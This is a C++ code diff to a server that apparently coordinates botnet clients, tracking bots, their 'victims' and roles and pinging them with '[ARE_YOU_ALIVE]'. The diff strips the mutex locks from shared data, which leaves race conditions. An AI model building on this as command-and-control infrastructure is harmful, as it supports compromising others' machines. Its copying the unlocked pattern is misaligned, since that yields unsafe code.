@@ -113,38 +113,35 @@ void server::handleGetClientsData(std::string& command, std::vector<std::string>
 	std::vector<std::string> msg;
 	std::vector<std::string> parameters = {"[IP-address]", "[Connected]", "[Messages]", "[Victims]", "[Role]"};
 	std::queue<std::vector<std::string>> output_data;
-	{
-		std::unique_lock<std::mutex> lock(clients_data_m_);
 
-		int msgs_to_transfer = ceil((float)clients_data_container_.size() / max_bot_num_per_msg);
+	int msgs_to_transfer = ceil((float)clients_data_container_.size() / max_bot_num_per_msg);
 
-		for (auto& bot : clients_data_container_) {
-			if (bot_counter >= max_bot_num_per_msg || !bot_counter) {
-				if (bot_counter) {
-					output_data.emplace(std::move(msg));
-					msg.clear();
-				}
-				bot_counter = 0;
-
-				msg.push_back(std::to_string(current_msg + 1));
-				msg.push_back(std::to_string(msgs_to_transfer));
-				msg.push_back(std::to_string(parameters.size()));
-
-				msg.insert(msg.end(), parameters.begin(), parameters.end());
-
-				++current_msg;
+	for (auto& bot : clients_data_container_) {
+		if (bot_counter >= max_bot_num_per_msg || !bot_counter) {
+			if (bot_counter) {
+				output_data.emplace(std::move(msg));
+				msg.clear();
 			}
+			bot_counter = 0;
 
-			msg.push_back(bot.first);
-			msg.push_back(bot.second.connected);
-			msg.push_back(std::to_string(bot.second.msgs_from));
-			msg.push_back(std::to_string(bot.second.victims));
-			msg.push_back(bot.second.status);
+			msg.push_back(std::to_string(current_msg + 1));
+			msg.push_back(std::to_string(msgs_to_transfer));
+			msg.push_back(std::to_string(parameters.size()));
 
-			++bot_counter;
+			msg.insert(msg.end(), parameters.begin(), parameters.end());
+
+			++current_msg;
 		}
-		output_data.emplace(std::move(msg));
+
+		msg.push_back(bot.first);
+		msg.push_back(bot.second.connected);
+		msg.push_back(std::to_string(bot.second.msgs_from));
+		msg.push_back(std::to_string(bot.second.victims));
+		msg.push_back(bot.second.status);
+
+		++bot_counter;
 	}
+	output_data.emplace(std::move(msg));
 	bots_data_output_ = std::move(output_data);
 
 	client->send(msg_parser_.genCommand(command, bots_data_output_.front()));
@@ -173,19 +170,13 @@ void server::handleRemoveClient(std::string& command, std::vector<std::string>& 
 	auto id = clients_data_container_.find(client->ip_)->second.id;
 
 	PRINT("REMOVING CLIENT: ", ip);
-	{
-		std::unique_lock<std::mutex> lock(clients_session_m_);
-		if (clients_sessions_container_.find(id) != clients_sessions_container_.end()) {
-			// TODO:@mark fix bug when removing bot from hashmap
-			// clients_sessions_container_.erase(id);
-		}
+	if (clients_sessions_container_.find(id) != clients_sessions_container_.end()) {
+		// TODO:@mark fix bug when removing bot from hashmap
+		// clients_sessions_container_.erase(id);
 	}
-	{
-		std::unique_lock<std::mutex> lock(clients_data_m_);
-		if (clients_data_container_.find(ip) != clients_data_container_.end()) {
-			// TODO:@mark fix same bug possibly
-			// clients_data_container_.erase(ip);
-		}
+	if (clients_data_container_.find(ip) != clients_data_container_.end()) {
+		// TODO:@mark fix same bug possibly
+		// clients_data_container_.erase(ip);
 	}
 }
 
@@ -266,34 +257,26 @@ void server::handleAddVictim(std::string& command, std::vector<std::string>& par
 void server::pingClients() {
 	std::string command = "[ARE_YOU_ALIVE]";
 	std::vector<std::pair<size_t, std::string>> inactive_clients;
-	{
-		std::unique_lock<std::mutex> lock_s(clients_session_m_);
-		std::unique_lock<std::mutex> lock_d(clients_data_m_);
-		for (auto& client : clients_sessions_container_) {
-			++client.second->inactive_timeout_count_;
-			if (client.second->inactive_timeout_count_ >= INACTIVE_COUNTER_MAX) {
-				PRINT("Disconnecting due to inactivity client:", client.second->ip_);
-				inactive_clients.push_back(std::make_pair(client.second->id_, client.second->ip_));
-			} else {
-				if (clients_data_container_.find(client.second->ip_) == clients_data_container_.end()) {
-					continue;
-				}
-				std::vector<std::string> output_params = {NONE_PARAMETERS};
-				client.second->send(msg_parser_.genCommand(command, output_params));
+	for (auto& client : clients_sessions_container_) {
+		++client.second->inactive_timeout_count_;
+
+		if (client.second->inactive_timeout_count_ >= INACTIVE_COUNTER_MAX) {
+			PRINT("Disconnecting due to inactivity client:", client.second->ip_);
+			inactive_clients.push_back(std::make_pair(client.second->id_, client.second->ip_));
+
+		} else {
+			if (clients_data_container_.find(client.second->ip_) == clients_data_container_.end()) {
+				continue;
 			}
+			std::vector<std::string> output_params = {NONE_PARAMETERS};
+			client.second->send(msg_parser_.genCommand(command, output_params));
 		}
 	}
 
 	for (auto& client : inactive_clients) {
-		{
-			std::unique_lock<std::mutex> lock(clients_session_m_);
-			clients_sessions_container_.erase(client.first);
-		}
-		{
-			std::unique_lock<std::mutex> lock(clients_data_m_);
-			if (clients_data_container_.find(client.second) != clients_data_container_.end()) {
-				clients_data_container_.erase(client.second);
-			}
+		clients_sessions_container_.erase(client.first);
+		if (clients_data_container_.find(client.second) != clients_data_container_.end()) {
+			clients_data_container_.erase(client.second);
 		}
 	}
 	timer_.expires_at(timer_.expires_at() + interval_);
@@ -322,10 +305,7 @@ const std::string server::getCurrentDateTime_() {
 	return buf;
 }
 
-void server::updateMsgCounter_(session* client) {
-	std::unique_lock<std::mutex> lock(clients_data_m_);
-	++clients_data_container_[client->ip_].msgs_from;
-}
+void server::updateMsgCounter_(session* client) { ++clients_data_container_[client->ip_].msgs_from; }
 
 bool server::isNumber_(const std::string& s) { return !s.empty() && std::all_of(s.begin(), s.end(), ::isdigit); }
 
